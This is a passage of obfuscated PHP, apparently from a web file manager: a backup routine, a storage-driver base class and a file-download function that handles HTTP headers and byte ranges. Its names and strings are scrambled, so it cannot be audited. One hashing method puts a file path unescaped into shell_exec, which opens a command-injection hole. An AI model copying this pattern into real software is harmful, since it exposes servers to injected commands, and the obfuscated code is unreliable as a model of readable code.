$Õå¾ê²•->dbType(); $ôğ˜úÅ« = array($ÅÛÓÓ­™[829] => $¨“ÛØ, $ÅÛÓÓ­™[830] => time()); Backup::set($ôğ˜úÅ«); $Ëƒ•‚Ç­ = $this->tmpFilesPath() . $ÅÛÓÓ­™[831] . self::$name . $ÅÛÓÓ­™[8]; del_dir($Ëƒ•‚Ç­); mk_dir($Ëƒ•‚Ç­); $İÈúü = $…ğëàÜ… = 0; $íÆ•²ŞÔ = new Task($ÅÛÓÓ­™[832], $ÅÛÓÓ­™[833], 0, LNG($ÅÛÓÓ­™[834]) . $ÅÛÓÓ­™[835] . LNG($ÅÛÓÓ­™[836])); try { $ÊøƒÍ¯£ = $Õå¾ê²•->db()->getTables(); } catch (Exception $Ü¾†ú) { $íÆ•²ŞÔ->end(); return !1; } $ÊøƒÍ¯£ = array_diff($ÊøƒÍ¯£, array($ÅÛÓÓ­™[837], $ÅÛÓÓ­™[838])); foreach ($ÊøƒÍ¯£ as $¥­êˆ­) { $İÈúü += $Õå¾ê²•->model($¥­êˆ­)->count(); } $íÆ•²ŞÔ->task[$ÅÛÓÓ­™[839]] = $İÈúü; $GLOBALS[$ÅÛÓÓ­™[840]] = self::$name; foreach ($ÊøƒÍ¯£ as $¥­êˆ­) { $˜¾È³‹ı = $Ëƒ•‚Ç­ . $¥­êˆ­ . $ÅÛÓÓ­™[841]; $¾‚ñœåŒ = null; if ($¥­êˆ­ == $ÅÛÓÓ­™[842] && (!isset($†èÙ´ê[$ÅÛÓÓ­™[807]]) || $†èÙ´ê[$ÅÛÓÓ­™[807]] == $ÅÛÓÓ­™[212])) { $¾‚ñœåŒ = self::$io; } $…ğëàÜ… += $Õå¾ê²•->sqlFromDb($¥­êˆ­, $˜¾È³‹ı, $íÆ•²ŞÔ, $¾‚ñœåŒ); } unset($GLOBALS[$ÅÛÓÓ­™[840]]); $íÆ•²ŞÔ->end(); if ($…ğëàÜ… > $İÈúü) { $İÈúü = $…ğëàÜ…; } $ôğ˜úÅ« = array($ÅÛÓÓ­™[829] => $¨“ÛØ, $ÅÛÓÓ­™[826] => 1, $ÅÛÓÓ­™[843] => $İÈúü, $ÅÛÓÓ­™[844] => $…ğëàÜ…, $ÅÛÓÓ­™[845] => time()); Backup::set($ôğ˜úÅ«); if ($İÈúü - $…ğëàÜ… > 0) { $¿‚¼æö = $ÅÛÓÓ­™[846]; if (stristr(I18n::getType(), $ÅÛÓÓ­™[847])) { $¿‚¼æö = $ÅÛÓÓ­™[848]; } write_log(array($¿‚¼æö, $ôğ˜úÅ«), $ÅÛÓÓ­™[833]); return !1; } return !0; } private function tmpFilesPath() { $Áà¶¿ı¬ =& $_SERVER[Ö†ØøÖ±]; $–€”ÓœÊ = TEMP_FILES; if ($GLOBALS[$Áà¶¿ı¬[6]][$Áà¶¿ı¬[89]][$Áà¶¿ı¬[849]]) { $–€”ÓœÊ = $GLOBALS[$Áà¶¿ı¬[6]][$Áà¶¿ı¬[89]][$Áà¶¿ı¬[849]]; if (!mk_dir($–€”ÓœÊ) || !is_writable($–€”ÓœÊ) || !IO::mkfile($–€”ÓœÊ . $Áà¶¿ı¬[850])) { $–€”ÓœÊ = TEMP_FILES; } } return $–€”ÓœÊ; } } goto dßÔÍ§¾¿; eÂßÀÃŒõß: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ê¡†¤ª =& $_SERVER[Ö†ØøÖ±]; $this->objectDriver = array($ê¡†¤ª[60], $ê¡†¤ª[61], $ê¡†¤ª[62], $ê¡†¤ª[63], $ê¡†¤ª[64], $ê¡†¤ª[65], $ê¡†¤ª[66], $ê¡†¤ª[67], $ê¡†¤ª[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ÿà”œƒğ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ÿà”œƒğ, $_SERVER[Ö†ØøÖ±][8]); } return $Ÿà”œƒğ; } public function iconvApp($•µºÇÒÖ) { return $•µºÇÒÖ; } public function iconvSystem($ˆêıìÀ) { return $ˆêıìÀ; } public function iconvTo($Š›Õ”€, $ôš¾«‚£, $µ×òŸ‡â) { $ÄˆÊÀ§“ =& $_SERVER[Ö†ØøÖ±]; if (!$Š›Õ”€ || !function_exists($ÄˆÊÀ§“[69])) { return $Š›Õ”€; } static $í”Ü«¾– = array(); $š¥Éôµ¼ = $ôš¾«‚£ . $ÄˆÊÀ§“[70] . $µ×òŸ‡â . $ÄˆÊÀ§“[71] . $Š›Õ”€; if (isset($í”Ü«¾–[$š¥Éôµ¼])) { return $í”Ü«¾–[$š¥Éôµ¼]; } if (function_exists($ÄˆÊÀ§“[72])) { $‡¦©ÏñÁ = @mb_convert_encoding($Š›Õ”€, $µ×òŸ‡â, $ôš¾«‚£); } else { $‡¦©ÏñÁ = @iconv($ôš¾«‚£, $µ×òŸ‡â, $Š›Õ”€); } $‡¦©ÏñÁ = $‡¦©ÏñÁ ? $‡¦©ÏñÁ : $Š›Õ”€; if (strstr($‡¦©ÏñÁ, $ÄˆÊÀ§“[73])) { $‡¦©ÏñÁ = str_replace($ÄˆÊÀ§“[73], $ÄˆÊÀ§“[11], $‡¦©ÏñÁ); } $í”Ü«¾–[$ôš¾«‚£ . $ÄˆÊÀ§“[70] . $µ×òŸ‡â . $ÄˆÊÀ§“[71] . $Š›Õ”€] = $‡¦©ÏñÁ; $í”Ü«¾–[$µ×òŸ‡â . $ÄˆÊÀ§“[70] . $ôš¾«‚£ . $ÄˆÊÀ§“[71] . $Š›Õ”€] = $Š›Õ”€; $í”Ü«¾–[$µ×òŸ‡â . $ÄˆÊÀ§“[70] . $ôš¾«‚£ . $ÄˆÊÀ§“[71] . $‡¦©ÏñÁ] = $Š›Õ”€; $í”Ü«¾–[$ôš¾«‚£ . $ÄˆÊÀ§“[70] . $µ×òŸ‡â . $ÄˆÊÀ§“[71] . $‡¦©ÏñÁ] = $‡¦©ÏñÁ; return $‡¦©ÏñÁ; } public function getPathInner($†Ù’¬­›) { $óáüÀ¼» = IO::init($†Ù’¬­›); return $óáüÀ¼»->path; } public function getPathOuter($¹´¯ŒÅÛ) { $§À­ÛÎå =& $_SERVER[Ö†ØøÖ±]; $òÈ›Ëıù = strlen(trim($this->pathBase, $§À­ÛÎå[8])); $¹´¯ŒÅÛ = substr(trim($¹´¯ŒÅÛ, $§À­ÛÎå[8]), $òÈ›Ëıù); return $this->pathDriver . $§À­ÛÎå[8] . ltrim($¹´¯ŒÅÛ, $§À­ÛÎå[8]); } public function isParentOf($Ê–Ø–’ö, $ØÒŸáêë) { $Ïö²¨à» =& $_SERVER[Ö†ØøÖ±]; $Ê–Ø–’ö = rtrim(strtolower($Ê–Ø–’ö), $Ïö²¨à»[8]) . $Ïö²¨à»[8]; $ØÒŸáêë = rtrim(strtolower($ØÒŸáêë), $Ïö²¨à»[8]) . $Ïö²¨à»[8]; $µãÕ–Ä° = strpos($ØÒŸáêë, $Ê–Ø–’ö) === 0; return $µãÕ–Ä°; } public function getType() { $åİ÷¢êÈ =& $_SERVER[Ö†ØøÖ±]; $ªø½Û®¤ = str_replace($åİ÷¢êÈ[74], $åİ÷¢êÈ[12], get_class($this)); return strtolower($ªø½Û®¤); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¸ò®‹Ğ³, $ãëñ¶ÆÂ) { $ê¥¢ï” =& $_SERVER[Ö†ØøÖ±]; $¤ì„ğ…Ï = rtrim($¸ò®‹Ğ³, $ê¥¢ï”[8]) . $ê¥¢ï”[8] . $ãëñ¶ÆÂ; $Ğá†Şïè = $this->exist($¤ì„ğ…Ï); return $Ğá†Şïè ? $¤ì„ğ…Ï : !1; } public function setModifyTime($¹‚üòíö, $Ì›Ê½¨” = '') { } public function renameObject($…©æ¥•£, $Ëçªç—) { $ó°÷¥Áš = $Ëçªç—; $…©æ¥•£ = $this->getPathOuter($…©æ¥•£); $Ëçªç— = $this->pathFather($…©æ¥•£) . $Ëçªç—; $•²ÓÅ»ë = IO::copy($…©æ¥•£, $this->pathFather($…©æ¥•£), REPEAT_RENAME_FOLDER, $ó°÷¥Áš); if ($•²ÓÅ»ë) { IO::remove($…©æ¥•£); } return $•²ÓÅ»ë ? $Ëçªç— : !1; } public function tempFile($òŠñûòø = '', $î°Ş‡À = '') { if (!$òŠñûòø) { $òŠñûòø = rand_string(15); } $ã×“è§° = TEMP_FILES . rand_string(15) . $_SERVER[Ö†ØøÖ±][8]; @mkdir($ã×“è§°, DEFAULT_PERRMISSIONS, !0); $úİšì´ = $ã×“è§° . $òŠñûòø; @touch($úİšì´); if ($î°Ş‡À) { file_put_contents($úİšì´, $î°Ş‡À); } return $úİšì´; } public function tempFileRemve($Â§ÄÉÈ) { @unlink($Â§ÄÉÈ); @rmdir($this->pathFather($Â§ÄÉÈ)); } public function mkfile($ƒÅé¼ê¢, $¬­ÍºÉš = '', $¦Ú¥óÜ = REPEAT_RENAME) { } public function mkdir($üë„ó£‡, $Œ•î¿‡ø = REPEAT_SKIP) { } public function delFile($»ªĞ–Ïò) { } public function delFolder($ˆšª‰ç) { } public function copyFile($èšÛ“óª, $£öñ¥Ó) { } public function moveFile($Óà˜Õ€Ÿ, $Şá¸ºÆÜ) { } public function remove($Å†àçŸß) { if ($this->isFile($Å†àçŸß)) { return $this->delFile($Å†àçŸß); } return $this->delFolder($Å†àçŸß); } public function rename($‚°ãÅú©, $¤·¢Ç‰µ) { } public function exist($áÎº¶×©) { } public function findByHash($«¡ÏÇ¨ğ = '', $‰ıË˜Ÿ = '') { return !1; } public function isFile($¬¸ÁÊÅš) { } public function isFolder($Š©’ò“Å) { } public function size($±îö—Û§) { } public function info($´ãİú) { } public function infoSimple($²— ¸œˆ) { return $this->info($²— ¸œˆ); } public function infoAuth($Ö€”òÉŠ) { return $this->info($Ö€”òÉŠ); } public function infoFull($ÌıÎë×…) { return $this->info($ÌıÎë×…); } public function infoFullSimple($éàµéË³) { return $this->info($éàµéË³); } public function infoWithChildren($×Û†”’ö) { $Öò¢’Æ =& $_SERVER[Ö†ØøÖ±]; static $¼Ò©ÔãØ = array(); if (isset($¼Ò©ÔãØ[$×Û†”’ö])) { return $¼Ò©ÔãØ[$×Û†”’ö]; } $Õâ©“Û = $this->info($×Û†”’ö); if ($Õâ©“Û && $Õâ©“Û[$Öò¢’Æ[33]] == $Öò¢’Æ[75]) { $ÔÏÖ¨Ä÷ = array($Öò¢’Æ[76] => 0, $Öò¢’Æ[77] => 0, $Öò¢’Æ[78] => 0); $this->infoChildren($×Û†”’ö, $ÔÏÖ¨Ä÷); $Õâ©“Û[$Öò¢’Æ[76]] = $ÔÏÖ¨Ä÷[$Öò¢’Æ[76]]; $Õâ©“Û[$Öò¢’Æ[79]] = array($Öò¢’Æ[80] => $ÔÏÖ¨Ä÷[$Öò¢’Æ[77]], $Öò¢’Æ[81] => $ÔÏÖ¨Ä÷[$Öò¢’Æ[78]]); $¼Ò©ÔãØ[$×Û†”’ö] = $Õâ©“Û; } return $Õâ©“Û; } public function listPath($íª‰Ëê, $ñõãíıç = false) { } public function has($ğ¡´ï×, $ä­´Í“’ = false, $ıµ¯… = false) { } public function canRead($¬¡æ‡ø) { } public function canWrite($ÒµŠŸËŠ) { } public function getContent($à½÷Äè) { } public function setContent($ÙÕŠø‰Ç, $™ŠÉ“Ş = '') { } protected function infoChildren($àèÉ¿·º, &$ŞÄş€‘) { $äô‹‡ =& $_SERVER[Ö†ØøÖ±]; check_abort_echo(); $ĞÙÏ”½Ö = $this->listPath($àèÉ¿·º, !0); $ĞÙÏ”½Ö = array_merge($ĞÙÏ”½Ö[$äô‹‡[82]], $ĞÙÏ”½Ö[$äô‹‡[83]]); foreach ($ĞÙÏ”½Ö as $èøšëÅ) { if ($èøšëÅ[$äô‹‡[33]] == $äô‹‡[75]) { $ŞÄş€‘[$äô‹‡[78]]++; $–Š°ãÀÈ = $this->getPathInner($èøšëÅ[$äô‹‡[84]]); $this->infoChildren($–Š°ãÀÈ, $ŞÄş€‘); } else { $ŞÄş€‘[$äô‹‡[77]]++; $ŞÄş€‘[$äô‹‡[76]] += $èøšëÅ[$äô‹‡[76]]; } } } public function fileSubstr($›à’‰Ì³, $Ÿ¿»ó¹Á, $›å³³· ) { } public function listAll($äÍ´ÕÜÔ) { } public function listAllMake($Š×´ƒÜú, &$ûø‹öı) { $Û¤¥’ =& $_SERVER[Ö†ØøÖ±]; check_abort_echo(); $Ï†Ôõé¦ = $this->listPath($Š×´ƒÜú, !0); if (!$Ï†Ôõé¦) { return; } $÷÷Ğ‹İÂ = array_merge($Ï†Ôõé¦[$Û¤¥’[82]], $Ï†Ôõé¦[$Û¤¥’[83]]); foreach ($÷÷Ğ‹İÂ as $Æ–å÷”ã) { $îáƒÕé¤ = $Æ–å÷”ã[$Û¤¥’[33]] == $Û¤¥’[75]; $‹û“áïÙ = array($Û¤¥’[84] => $Æ–å÷”ã[$Û¤¥’[84]], $Û¤¥’[75] => $îáƒÕé¤); if (isset($Æ–å÷”ã[$Û¤¥’[76]])) { $‹û“áïÙ[$Û¤¥’[76]] = $Æ–å÷”ã[$Û¤¥’[76]]; } if (isset($Æ–å÷”ã[$Û¤¥’[85]])) { $‹û“áïÙ[$Û¤¥’[85]] = $Æ–å÷”ã[$Û¤¥’[85]]; } if (!$îáƒÕé¤) { $ûø‹öı[] = $‹û“áïÙ; continue; } $ûø‹öı[] = $‹û“áïÙ; $š¶ºœÄ® = $Æ–å÷”ã[$Û¤¥’[84]]; $¿–ùô» = $this->pathDriver; if (substr($Æ–å÷”ã[$Û¤¥’[84]], 0, strlen($¿–ùô»)) == $¿–ùô») { $š¶ºœÄ® = substr($š¶ºœÄ®, strlen($¿–ùô»)); } $this->listAllMake($š¶ºœÄ®, $ûø‹öı); } } public function listAllSimple($ñÇà³¶», $ğÚŸïÉ¡ = false) { $‹ç¶ó§ = $this->listAll($ñÇà³¶»); return $this->listAllSimpleMake($‹ç¶ó§, $this->getPathOuter($ñÇà³¶»), $ğÚŸïÉ¡); } public function listAllSimpleMake($÷õœˆíÃ, $Äîá´Ç´, $÷Ãï³Ëó) { $©‹Æ®æ =& $_SERVER[Ö†ØøÖ±]; $È¥àç–û = array(); $Äîá´Ç´ = rtrim(get_path_father($Äîá´Ç´), $©‹Æ®æ[8]) . $©‹Æ®æ[8]; foreach ($÷õœˆíÃ as $Å»»„€) { $ßõ™À°Ê = array($©‹Æ®æ[84] => $Å»»„€[$©‹Æ®æ[84]], $©‹Æ®æ[86] => $Å»»„€[$©‹Æ®æ[84]], $©‹Æ®æ[75] => $Å»»„€[$©‹Æ®æ[75]]); if (isset($Å»»„€[$©‹Æ®æ[76]]) && !$Å»»„€[$©‹Æ®æ[75]]) { $ßõ™À°Ê[$©‹Æ®æ[76]] = $Å»»„€[$©‹Æ®æ[76]]; } if (isset($Å»»„€[$©‹Æ®æ[85]])) { $ßõ™À°Ê[$©‹Æ®æ[85]] = $Å»»„€[$©‹Æ®æ[85]]; } if (is_array($Å»»„€[$©‹Æ®æ[87]])) { $ßõ™À°Ê[$©‹Æ®æ[86]] = $Å»»„€[$©‹Æ®æ[87]][$©‹Æ®æ[84]]; $ßõ™À°Ê[$©‹Æ®æ[76]] = $Å»»„€[$©‹Æ®æ[87]][$©‹Æ®æ[76]]; $ßõ™À°Ê[$©‹Æ®æ[85]] = $Å»»„€[$©‹Æ®æ[87]][$©‹Æ®æ[85]]; } else { if (substr($Å»»„€[$©‹Æ®æ[84]], 0, strlen($Äîá´Ç´)) == $Äîá´Ç´) { $ßõ™À°Ê[$©‹Æ®æ[84]] = substr($Å»»„€[$©‹Æ®æ[84]], strlen($Äîá´Ç´)); } } $„Ä Œ‘ğ = $Å»»„€[$©‹Æ®æ[75]] ? $©‹Æ®æ[8] : $©‹Æ®æ[12]; $ßõ™À°Ê[$©‹Æ®æ[86]] = rtrim($ßõ™À°Ê[$©‹Æ®æ[86]], $©‹Æ®æ[8]) . $„Ä Œ‘ğ; $ßõ™À°Ê[$©‹Æ®æ[84]] = $©‹Æ®æ[8] . trim($ßõ™À°Ê[$©‹Æ®æ[84]], $©‹Æ®æ[8]) . $„Ä Œ‘ğ; if (!$÷Ãï³Ëó) { $ÁÑ—æë = explode($©‹Æ®æ[8], trim($ßõ™À°Ê[$©‹Æ®æ[84]], $©‹Æ®æ[8])); $ßõ™À°Ê[$©‹Æ®æ[84]] = $©‹Æ®æ[8] . implode($©‹Æ®æ[8], array_slice($ÁÑ—æë, 1)) . $„Ä Œ‘ğ; } $È¥àç–û[] = $ßõ™À°Ê; } return array_sort_by($È¥àç–û, $©‹Æ®æ[84]); } public function upload($â¯Ó×ø©, $¯æ¢Í ×, $Ã¤„÷ª = false, $º…Ö‘“Ç = REPEAT_REPLACE) { } public function uploadFileByID($Û¾÷Â±, $‰º§ˆİ, $¤öÆº®”) { } public function uploadFileByPath($úã‰ , $æˆÏ¯¶, $î–­”° = array()) { } public function isUploadServer() { $ºÒìÕûú =& $_SERVER[Ö†ØøÖ±]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ºÒìÕûú[88]) { return !0; } return $GLOBALS[$ºÒìÕûú[6]][$ºÒìÕûú[89]][$ºÒìÕûú[90]]; } public function isFileOutServer() { $Şú²óõÔ =& $_SERVER[Ö†ØøÖ±]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Şú²óõÔ[88]) { return !0; } return $GLOBALS[$Şú²óõÔ[6]][$Şú²óõÔ[89]][$Şú²óõÔ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($‚ªş”») { $ƒ³à¥¾µ =& $_SERVER[Ö†ØøÖ±]; if (!$this->isCdnHost()) { return $‚ªş”»; } return str_replace(trim(get_url_root($‚ªş”»), $ƒ³à¥¾µ[8]), trim($this->cdnHost, $ƒ³à¥¾µ[8]), $‚ªş”»); } public function uploadLink($Ì²ı€æ¬, $–¢æ•Ôá = 0) { $èŒÓÁ§ =& $_SERVER[Ö†ØøÖ±]; if ($this->isUploadServer()) { return; } $¬ëÛ€²À = $this->getType(); if (!in_array($¬ëÛ€²À, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ŠÇ¨¿®Ô = 1024 * 1024 * 10; $ë¦ƒ†úÑ = $–¢æ•Ôá <= $ŠÇ¨¿®Ô ? $èŒÓÁ§[92] : $èŒÓÁ§[93]; $ñúÑ® = (!$–¢æ•Ôá ? 1 : ceil($–¢æ•Ôá / pow(1024, 3))) * 3600 * 4; $÷’ƒê¶Ğ = $this->{$ë¦ƒ†úÑ}($Ì²ı€æ¬, $ñúÑ®); if ($÷’ƒê¶Ğ) { $÷’ƒê¶Ğ[$èŒÓÁ§[94]] = $Ì²ı€æ¬; $÷’ƒê¶Ğ[$èŒÓÁ§[95]] = $¬ëÛ€²À; } return $÷’ƒê¶Ğ; } public function uploadFormData($š—Â•˜ì, $Úâà±Î = 3600) { } public function multiUploadFormData($©ÖŠÓ, $²û¢Ôé– = 3600) { } public function download($¡šçÂ«, $¶ Òº²°) { } public function ext($ìÒÊöª) { $¤ìõªÏë =& $_SERVER[Ö†ØøÖ±]; if (strpos($ìÒÊöª, $¤ìõªÏë[8]) === -1) { $ÕÙÓÃÉô = $ìÒÊöª; } else { $ÕÙÓÃÉô = $this->pathThis($ìÒÊöª); } $«©…Íì± = $¤ìõªÏë[12]; if (strstr($ÕÙÓÃÉô, $¤ìõªÏë[10])) { $«©…Íì± = substr($ÕÙÓÃÉô, strrpos($ÕÙÓÃÉô, $¤ìõªÏë[10]) + 1); $«©…Íì± = strtolower($«©…Íì±); } if (strlen($«©…Íì±) > 3 && preg_match($¤ìõªÏë[96], $«©…Íì±, $Š¼ß§¹ò)) { $«©…Íì± = $¤ìõªÏë[12]; } return $«©…Íì±; } public function pathThis($ªß’ÛÚ™) { $ûÆÖšØ =& $_SERVER[Ö†ØøÖ±]; $ªß’ÛÚ™ = str_replace($ûÆÖšØ[97], $ûÆÖšØ[8], rtrim($ªß’ÛÚ™, $ûÆÖšØ[8])); $ğãí“ß = strrpos($ªß’ÛÚ™, $ûÆÖšØ[8]); if ($ğãí“ß === !1) { return $ªß’ÛÚ™; } return substr($ªß’ÛÚ™, $ğãí“ß + 1); } public function pathFather($›™ß˜„) { $ŒüÅÜ™ì =& $_SERVER[Ö†ØøÖ±]; $›™ß˜„ = str_replace($ŒüÅÜ™ì[97], $ŒüÅÜ™ì[8], rtrim($›™ß˜„, $ŒüÅÜ™ì[8])); $ø¢äŸÅÌ = strrpos($›™ß˜„, $ŒüÅÜ™ì[8]); if ($ø¢äŸÅÌ === !1) { return $ŒüÅÜ™ì[12]; } return substr($›™ß˜„, 0, $ø¢äŸÅÌ + 1); } public function hashSimple($¨¨—´Ÿ) { $«ñºÖ›Ç =& $_SERVER[Ö†ØøÖ±]; if (!$¨¨—´Ÿ) { return md5($«ñºÖ›Ç[12]); } $÷—×© = $this->size($¨¨—´Ÿ); $¦½ï²«½ = 200; $•ÔÔÅº— = 50; if ($÷—×© <= $¦½ï²«½ * $•ÔÔÅº—) { return $this->hashMd5($¨¨—´Ÿ) . $÷—×©; } $É×êáŒ = intval($÷—×© / $•ÔÔÅº—); $ığæ­æ = $«ñºÖ›Ç[12]; for ($•şÕßÏ¦ = 0; $•şÕßÏ¦ < $•ÔÔÅº—; $•şÕßÏ¦++) { $ığæ­æ .= $this->fileSubstr($¨¨—´Ÿ, $É×êáŒ * $•şÕßÏ¦, $¦½ï²«½); } $ığæ­æ .= $this->fileSubstr($¨¨—´Ÿ, $÷—×© - $¦½ï²«½, $¦½ï²«½); return md5($ığæ­æ) . $÷—×©; } public static $md5Cache = array(); public function hashMd5($Ááè”é) { if (!$Ááè”é) { return md5($_SERVER[Ö†ØøÖ±][12]); } $Ááè”é = $this->iconvSystem($Ááè”é); if (isset(self::$md5Cache[$Ááè”é])) { return self::$md5Cache[$Ááè”é]; } self::$md5Cache[$Ááè”é] = $this->hashMd5Shell($Ááè”é); if (!self::$md5Cache[$Ááè”é]) { self::$md5Cache[$Ááè”é] = @md5_file($Ááè”é); } return self::$md5Cache[$Ááè”é]; } private function hashMd5Shell($¥º¯í) { $ÖĞ‘Ğä« =& $_SERVER[Ö†ØøÖ±]; if (!$¥º¯í) { return md5($ÖĞ‘Ğä«[12]); } if (!function_exists($ÖĞ‘Ğä«[98])) { return !1; } $›µÔ‘õÈ = array($ÖĞ‘Ğä«[99], $ÖĞ‘Ğä«[100]); $Æ¡”Ù¥ = Cache::get($ÖĞ‘Ğä«[101]); if (!$Æ¡”Ù¥) { $¨‡ÜÛƒß = BASIC_PATH . $ÖĞ‘Ğä«[102]; $×ùíÆ‡µ = md5_file($¨‡ÜÛƒß); $Æ¡”Ù¥ = $ÖĞ‘Ğä«[103]; foreach ($›µÔ‘õÈ as $¶Â¨¸şÍ) { $İÊçÊï‚ = shell_exec($¶Â¨¸şÍ . "\x20\x22{$¨‡ÜÛƒß}\42"); if ($İÊçÊï‚ && substr(trim($İÊçÊï‚), 0, 32) == $×ùíÆ‡µ) { $Æ¡”Ù¥ = $¶Â¨¸şÍ; break; } } Cache::set($ÖĞ‘Ğä«[101], $Æ¡”Ù¥, 3600); } if ($Æ¡”Ù¥ == $ÖĞ‘Ğä«[103]) { return !1; } $İÊçÊï‚ = shell_exec($Æ¡”Ù¥ . "\40\42{$¥º¯í}\42"); $İÊçÊï‚ = str_replace($ÖĞ‘Ğä«[104], $ÖĞ‘Ğä«[12], $İÊçÊï‚); return substr($İÊçÊï‚, 0, 32); } public function link($øº®ÖÀÁ) { return $øº®ÖÀÁ; } public function fileOut($ììê¨Ú, $ÈµÁŒº‡ = false, $êó£üù = false, $®¶½üªå = '') { $‰œªİ®© =& $_SERVER[Ö†ØøÖ±]; $this->cacheMethod(null, null); if (!$ììê¨Ú || !$this->exist($ììê¨Ú)) { show_json(LNG($‰œªİ®©[105]), !1, $êó£üù); } $ËŞ€ßİİ = $this->getType() == $‰œªİ®©[106]; $ş‹ÊÉ´ = $GLOBALS[$‰œªİ®©[6]][$‰œªİ®©[89]][$‰œªİ®©[107]][$‰œªİ®©[108]]; $ÚûÎ®» = (double) $GLOBALS[$‰œªİ®©[6]][$‰œªİ®©[89]][$‰œªİ®©[107]][$‰œªİ®©[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¹“¿–¨ç = $this->infoFull($ììê¨Ú); $ğµØü‚¡ = $¹“¿–¨ç[$‰œªİ®©[76]]; $Ÿ›½‹«Ù = gmdate($‰œªİ®©[110], $¹“¿–¨ç[$‰œªİ®©[85]]); $ñÙåî°Õ = $êó£üù ? $êó£üù : $this->iconvApp($¹“¿–¨ç[$‰œªİ®©[32]]); $öûñ•«å = 0; $Õ‰‚ï = $ğµØü‚¡ - 1; $¢®º”¬ = $this->ext($ñÙåî°Õ); if (in_array($¢®º”¬, array($‰œªİ®©[111], $‰œªİ®©[112], $‰œªİ®©[113], $‰œªİ®©[114]))) { $¢®º”¬ = $‰œªİ®©[115]; } if (in_array($¢®º”¬, array($‰œªİ®©[116]))) { $¢®º”¬ = $‰œªİ®©[117]; } if (!$®¶½üªå) { $®¶½üªå = md5($Ÿ›½‹«Ù . $ğµØü‚¡); } $®¶½üªå = $‰œªİ®©[118] . $®¶½üªå . $‰œªİ®©[118]; $É£òõ– = get_file_mime($¢®º”¬); $‘üêÚä = !0; $‘üêÚä = isset($_GET[$‰œªİ®©[119]]) ? !1 : !0; if ($ÈµÁŒº‡ === !1 && !mime_support($É£òõ–)) { $É£òõ– = $‰œªİ®©[120]; } header($‰œªİ®©[121]); header($‰œªİ®©[122] . $É£òõ–); $¼«øú”– = rawurlencode($ñÙåî°Õ); $¼«øú”– = $‰œªİ®©[118] . $¼«øú”– . $‰œªİ®©[123] . $¼«øú”–; if ($ÈµÁŒº‡) { header($‰œªİ®©[124]); header($‰œªİ®©[125] . $¼«øú”–); } else { if ($‘üêÚä) { header($‰œªİ®©[126] . $¼«øú”–); } } header($‰œªİ®©[127] . gmdate($‰œªİ®©[110], time() + 3600 * 24 * 30) . $‰œªİ®©[128]); header($‰œªİ®©[129]); header($‰œªİ®©[130]); header($‰œªİ®©[131]); if (isset($_SERVER[$‰œªİ®©[132]]) && strtotime($_SERVER[$‰œªİ®©[132]]) == $¹“¿–¨ç[$‰œªİ®©[85]]) { header($‰œªİ®©[133], !0, 304); die; } if (isset($_SERVER[$‰œªİ®©[134]]) && $_SERVER[$‰œªİ®©[134]] == $®¶½üªå) { header($‰œªİ®©[135] . $®¶½üªå, !0, 304); die; } header($‰œªİ®©[135] . $®¶½üªå); header($‰œªİ®©[136] . $Ÿ›½‹«Ù . $‰œªİ®©[128]); header($‰œªİ®©[137] . $ñÙåî°Õ); header($‰œªİ®©[138]); header($‰œªİ®©[139] . $ğµØü‚¡); header($‰œªİ®©[140]); Hook::trigger($‰œªİ®©[141], $ììê¨Ú, $ğµØü‚¡, $ñÙåî°Õ, $¢®º”¬); if (!$ÈµÁŒº‡ && $¢®º”¬ == $‰œªİ®©[142]) { if ($ğµØü‚¡ > 1024 * 1024 * 5) { die; } $†¡ƒÛÓ¦ = $this->getContent($ììê¨Ú); $†¡ƒÛÓ¦ = Html::clearSVG($†¡ƒÛÓ¦); header($‰œªİ®©[143] . strlen($†¡ƒÛÓ¦)); echo $†¡ƒÛÓ¦; die; } $ê£îé…Ş = strtolower($_SERVER[$‰œªİ®©[144]]); if ($ËŞ€ßİİ && $ê£îé…Ş && $ş‹ÊÉ´) { if (strstr($ê£îé…Ş, $‰œªİ®©[145])) { header($‰œªİ®©[146] . $ììê¨Ú); } else { if (strstr($ê£îé…Ş, $‰œªİ®©[147])) { header($‰œªİ®©[148] . $ììê¨Ú); } else { if (strstr($ê£îé…Ş, $‰œªİ®©[149])) { header($‰œªİ®©[150] . $ììê¨Ú); } } } if ($ÚûÎ®») { header($‰œªİ®©[151] . $ÚûÎ®»); } return; } if (isset($_SERVER[$‰œªİ®©[152]])) { if (preg_match($‰œªİ®©[153], $_SERVER[$‰œªİ®©[152]], $®ì¥§ü—)) { $öûñ•«å = intval($®ì¥§ü—[1]); $öûñ•«å = $öûñ•«å <= 0 ? 0 : ($öûñ•«å >= $Õ‰‚ï ? $Õ‰‚ï : $öûñ•«å); if (!empty($®ì¥§ü—[2])) { $şÚÙõ¼Æ = intval($®ì¥§ü—[2]); $Õ‰‚ï = $şÚÙõ¼Æ < $öûñ•«å ? $öûñ•«å : ($şÚÙõ¼Æ >= $Õ‰‚ï ? $Õ‰‚ï : $şÚÙõ¼Æ); } } header($‰œªİ®©[154]); header("\x43\157\x6e\164\145\156\164\55\x52\x61\156\147\x65\72\40\x62\x79\164\x65\163\x20{$öûñ•«å}\x2d{$Õ‰‚ï}\x2f" . $ğµØü‚¡); } else { header($‰œªİ®©[155]); } header($‰œªİ®©[156]); $¾à÷¼„À = !0; if ($_SERVER[$‰œªİ®©[157]] == $‰œªİ®©[158] && $ğµØü‚¡ > 1204 * 1024 * 1024 * 2) { $¾à÷¼„À = !1; } if ($¾à÷¼„À) { header($‰œªİ®©[159] . ($Õ‰‚ï - $öûñ•«å + 1)); } if ($_SERVER[$‰œªİ®©[160]] == $‰œªİ®©[161]) { return; } $ƒ†ŸæŠ = 1024 * 100; $ïÕ’•­» = 0; if ($ÚûÎ®») { $ïÕ’•­» = intval(1000 * 1000 * ($ƒ†ŸæŠ / $ÚûÎ®»)); } while ($öûñ•«å <= $Õ‰‚ï) { $Ñ¿¾‚¨ = timeFloat(); check_abort(); $©£á¤„ = $Õ‰‚ï - $öûñ•«å + 1; if ($©£á¤„ 